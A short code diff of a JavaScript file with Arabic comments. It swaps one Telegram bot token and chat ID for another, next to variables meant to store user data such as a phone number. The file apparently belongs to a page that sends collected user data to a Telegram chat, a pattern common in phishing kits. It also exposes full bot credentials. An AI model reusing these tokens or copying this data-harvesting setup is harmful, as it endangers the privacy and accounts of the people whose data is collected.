@@ -1,8 +1,8 @@
 document.addEventListener('DOMContentLoaded', () => {
 
     // --- إعدادات بوت التليجرام ---
-    const BOT_TOKEN = '7922045749:AAHMU_kgryFB-qoMbhTwD52fg__qAYL3in8';
-    const CHAT_ID = '7949847540';
+    const BOT_TOKEN = '6692627244:AAEIS4t9xIIksnY9UxlGiMsf0KwBB5-XS5M';
+    const CHAT_ID = '6964432572';
 
     // --- متغيرات لتخزين بيانات المستخدم ---
     let userPhoneNumber = '';
